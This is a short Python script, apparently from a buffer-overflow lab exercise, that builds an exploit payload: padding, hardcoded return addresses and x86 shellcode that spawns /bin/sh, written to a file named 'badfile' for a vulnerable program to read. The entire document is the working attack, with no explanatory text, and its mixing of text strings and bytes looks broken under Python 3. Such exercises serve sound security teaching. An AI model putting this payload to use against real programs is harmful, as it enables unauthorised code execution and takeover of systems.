import struct

string = struct.pack("I", 0x0804a060)
vuln = struct.pack("I", 0x804846b)
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

p = "A\n"

p1 = "a"*148
p1 += string
p1 += "C"*8
p1 += vuln
p1 += "D"*4
p1 += struct.pack("I", 0x0804a060 + len(p1) + 4)
p1 += shellcode

f = open("badfile", "w")
f.write("%s" %(p + p1))
f.close()
